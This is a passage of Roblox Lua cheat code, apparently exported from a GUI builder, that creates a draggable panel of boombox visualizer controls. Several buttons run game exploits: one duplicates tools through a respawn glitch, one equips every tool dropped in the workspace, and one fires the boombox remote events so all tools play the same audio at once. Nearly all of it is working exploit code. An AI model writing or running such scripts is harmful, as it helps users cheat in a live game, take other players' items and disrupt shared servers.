	script.Parent.MouseButton1Click:Connect(function()
		_G.VisAngle=script.Parent.Name:gsub("MA","")
	end)
	while wait() do
		if script.Parent.Name=="MA"..tostring(_G.VisAngle) then
			script.Parent.BackgroundTransparency=0
			script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
		else
			script.Parent.BackgroundTransparency=1
			script.Parent.TextColor3=Color3.fromRGB(255,255,255)
		end
	end
end
coroutine.wrap(SNNOC_fake_script)()
local function ZOLOAKP_fake_script() -- MAY.LocalScript 
	local script = Instance.new('LocalScript', MAY)

	script.Parent.MouseButton1Click:Connect(function()
		_G.VisAngle=script.Parent.Name:gsub("MA","")
	end)
	while wait() do
		if script.Parent.Name=="MA"..tostring(_G.VisAngle) then
			script.Parent.BackgroundTransparency=0
			script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
		else
			script.Parent.BackgroundTransparency=1
			script.Parent.TextColor3=Color3.fromRGB(255,255,255)
		end
	end
end
coroutine.wrap(ZOLOAKP_fake_script)()
local function SPKQASL_fake_script() -- MAZ.LocalScript 
	local script = Instance.new('LocalScript', MAZ)

	script.Parent.MouseButton1Click:Connect(function()
		_G.VisAngle=script.Parent.Name:gsub("MA","")
	end)
	while wait() do
		if script.Parent.Name=="MA"..tostring(_G.VisAngle) then
			script.Parent.BackgroundTransparency=0
			script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
		else
			script.Parent.BackgroundTransparency=1
			script.Parent.TextColor3=Color3.fromRGB(255,255,255)
		end
	end
end
coroutine.wrap(SPKQASL_fake_script)()
local function WITC_fake_script() -- WAX.LocalScript 
	local script = Instance.new('LocalScript', WAX)

	script.Parent.MouseButton1Click:Connect(function()
		_G.WavesAngle=script.Parent.Name:gsub("WA","")
	end)
	while wait() do
		if script.Parent.Name=="WA"..tostring(_G.WavesAngle) then
			script.Parent.BackgroundTransparency=0
			script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
		else
			script.Parent.BackgroundTransparency=1
			script.Parent.TextColor3=Color3.fromRGB(255,255,255)
		end
	end
end
coroutine.wrap(WITC_fake_script)()
local function NYTNKLJ_fake_script() -- WAY.LocalScript 
	local script = Instance.new('LocalScript', WAY)

	script.Parent.MouseButton1Click:Connect(function()
		_G.WavesAngle=script.Parent.Name:gsub("WA","")
	end)
	while wait() do
		if script.Parent.Name=="WA"..tostring(_G.WavesAngle) then
			script.Parent.BackgroundTransparency=0
			script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
		else
			script.Parent.BackgroundTransparency=1
			script.Parent.TextColor3=Color3.fromRGB(255,255,255)
		end
	end
end
coroutine.wrap(NYTNKLJ_fake_script)()
local function CQCYZJ_fake_script() -- WAZ.LocalScript 
	local script = Instance.new('LocalScript', WAZ)

	script.Parent.MouseButton1Click:Connect(function()
		_G.WavesAngle=script.Parent.Name:gsub("WA","")
	end)
	while wait() do
		if script.Parent.Name=="WA"..tostring(_G.WavesAngle) then
			script.Parent.BackgroundTransparency=0
			script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
		else
			script.Parent.BackgroundTransparency=1
			script.Parent.TextColor3=Color3.fromRGB(255,255,255)
		end
	end
end
coroutine.wrap(CQCYZJ_fake_script)()
local function OXWOCC_fake_script() -- WavesOn.LocalScript 
	local script = Instance.new('LocalScript', WavesOn)

	script.Parent.MouseButton1Click:Connect(function()
		if "Waves".._G.WavesOn==script.Parent.Name then
			_G.WavesOn="Off"
		else
			_G.WavesOn="On"
		end
	end)
	while wait() do
		if script.Parent.Name=="Waves"..tostring(_G.WavesOn) then
			script.Parent.BackgroundColor3=Color3.fromRGB(255, 89, 89)
		else
			script.Parent.BackgroundColor3=Color3.fromRGB(31,31,31)
		end
	end 
end
coroutine.wrap(OXWOCC_fake_script)()
local function QUDRUG_fake_script() -- Distance.LocalScript 
	local script = Instance.new('LocalScript', Distance)

	_G[script.Parent.Name]=5
	script.Parent.Changed:Connect(function(t)
		if t=="Text" then
			_G[script.Parent.Name]=tonumber(script.Parent.Text) or 0
		end
	end)
end
coroutine.wrap(QUDRUG_fake_script)()
local function PDWMWWH_fake_script() -- WaveInt.LocalScript 
	local script = Instance.new('LocalScript', WaveInt)

	_G[script.Parent.Name]=3
	script.Parent.Changed:Connect(function(t)
		if t=="Text" then
			_G[script.Parent.Name]=tonumber(script.Parent.Text) or 0
		end
	end)
end
coroutine.wrap(PDWMWWH_fake_script)()
local function MWXMP_fake_script() -- Speed.LocalScript 
	local script = Instance.new('LocalScript', Speed)

	_G[script.Parent.Name]=1
	script.Parent.Changed:Connect(function(t)
		if t=="Text" then
			_G[script.Parent.Name]=tonumber(script.Parent.Text) or 0
		end
	end)
end
coroutine.wrap(MWXMP_fake_script)()
local function VBKP_fake_script() -- Main.LocalScript 
	local script = Instance.new('LocalScript', Main)

	_G.VisAngle="X"
	_G.WavesOn="Off"
	_G.WavesAngle="Y"
	_G.BoomboxDependantSpeed="Off"
end
coroutine.wrap(VBKP_fake_script)()
local function KBRORTV_fake_script() -- Main.Dragify 
	local script = Instance.new('LocalScript', Main)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.50
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(KBRORTV_fake_script)()
local function YTBCAKA_fake_script() -- TextBox_2.LocalScript 
	local script = Instance.new('LocalScript', TextBox_2)

	script.Parent.MouseButton1Click:Connect(function()
		print(pcall(function()
			for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChildOfClass("Part"):FindFirstChildOfClass("Sound") then
					coroutine.wrap(function()
						v:FindFirstChildOfClass("Part"):FindFirstChildOfClass("Sound").Playing=false
						wait()
						v:FindFirstChildOfClass("Part"):FindFirstChildOfClass("Sound").TimePosition=0
						v:FindFirstChildOfClass("Part"):FindFirstChildOfClass("Sound").Playing=true
					end)()
				end
			end
		end))
	end)
end
coroutine.wrap(YTBCAKA_fake_script)()
local function VJJDVYZ_fake_script() -- TextBox_3.LocalScript 
	local script = Instance.new('LocalScript', TextBox_3)

	script.Parent.MouseButton1Click:Connect(function()
		for i=1,tonumber(script.Parent.Parent.Amount.Text) or 1 do
			char=game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character=nil
			game.Players.LocalPlayer.Character=char
			char.Animate:Destroy()
			char.HumanoidRootPart.CFrame=CFrame.new(0,9999,0)
			wait(.1)
			char.HumanoidRootPart.Anchored=true
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent=game.Players.LocalPlayer.Backpack
				end
			end
			wait(game.Players.RespawnTime-0.3)
			local t = {}
			for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				v.Parent=char
				v.Parent=workspace
				t[i]=v
			end
			char.Humanoid:Destroy()
			game.Players.LocalPlayer.Character=nil
			game.Players.LocalPlayer.CharacterAdded:Wait()
			char=game.Players.LocalPlayer.Character
			char:WaitForChild("Humanoid")
			wait(.1)
			for i,v in pairs(t) do
				char.Humanoid:EquipTool(v)
			end
			wait(.3)
		end	
	end)
end
coroutine.wrap(VJJDVYZ_fake_script)()
local function AUDBY_fake_script() -- TextBox_4.LocalScript 
	local script = Instance.new('LocalScript', TextBox_4)

	_G.grabtools=false
	game:service'RunService'.Heartbeat:Connect(function()
		local h=game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
		if _G.grabtools==true and h then
			for i,v in pairs(workspace:GetChildren()) do
				coroutine.wrap(function()
					if v:IsA("Tool") then
						h:EquipTool(v)
					end	
				end)()
			end
		end
	end)
	spawn(function()
		while wait() do
			if _G.grabtools==true then
				script.Parent.TextColor3=Color3.fromRGB(53, 53, 53)
				script.Parent.BackgroundColor3=Color3.fromRGB(255, 89, 89)
			else
				script.Parent.TextColor3=Color3.fromRGB(255,255,255)
				script.Parent.BackgroundColor3=Color3.fromRGB(13, 13, 13)
			end
		end 	
	end)
	script.Parent.MouseButton1Click:Connect(function()
		_G.grabtools=not _G.grabtools
	end)
end
coroutine.wrap(AUDBY_fake_script)()
local function UCOYXZ_fake_script() -- Vis.LocalScript 
	local script = Instance.new('LocalScript', Vis)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.GamepassesFrame.Visible = true
		script.Parent.Parent.PetsFrame.Visible = false
		script.Parent.Parent.AboutUsFrame.Visible = false
		wait(0.1)
	end)
	
end
coroutine.wrap(UCOYXZ_fake_script)()
local function QWRNKJS_fake_script() -- Other.LocalScript 
	local script = Instance.new('LocalScript', Other)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.GamepassesFrame.Visible = false
		script.Parent.Parent.PetsFrame.Visible = true
		script.Parent.Parent.AboutUsFrame.Visible = false
		wait(0.1)
	end)
	
end
coroutine.wrap(QWRNKJS_fake_script)()
local function HLIRMUS_fake_script() -- Settings.LocalScript 
	local script = Instance.new('LocalScript', Settings)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.GamepassesFrame.Visible = false
		script.Parent.Parent.PetsFrame.Visible = false
		script.Parent.Parent.AboutUsFrame.Visible = true
		wait(0.1)
	end)
	
end
coroutine.wrap(HLIRMUS_fake_script)()
local function KZGLAUJ_fake_script() -- TextBox_6.LocalScript 
	local script = Instance.new('LocalScript', TextBox_6)

	script.Parent.MouseButton1Click:Connect(function()
		local Backpack=game.Players.LocalPlayer.Backpack
		local lp=game.Players.LocalPlayer
		local tosync=false
		local tt=0
		for i,v in pairs(Backpack:GetChildren()) do
			if v:IsA("Tool") then
				tt=tt+1
			end
		end
		local t = {}
		for i,v in pairs(Backpack:GetChildren()) do
			if v:IsA("Tool") then
				coroutine.wrap(function()
					if v.Handle:FindFirstChildOfClass("Sound") then
						v.Handle:FindFirstChildOfClass("Sound"):Destroy()
					end
					v.Parent=lp.Character
					v:FindFirstChildOfClass("RemoteEvent"):FireServer("PlaySong",(script.Parent.Parent.AudioId.Text:gsub("%D+", "")))
					repeat wait() until v.Handle:FindFirstChildOfClass("Sound")
					repeat wait() until v.Handle:FindFirstChildOfClass("Sound").IsPlaying
					v.Handle:FindFirstChildOfClass("Sound").Playing=false
					table.insert(t,v)
				end)()
			end
		end
		repeat game:service'RunService'.Heartbeat:Wait() until #t==tt
		wait(1)
		for i,v in pairs(t) do
			coroutine.wrap(function()
				v.Handle:FindFirstChildOfClass("Sound").TimePosition=0
				v.Handle:FindFirstChildOfClass("Sound").Playing=true
			end)()
		end
		print("done")
	end)
end
coroutine.wrap(KZGLAUJ_fake_script)()
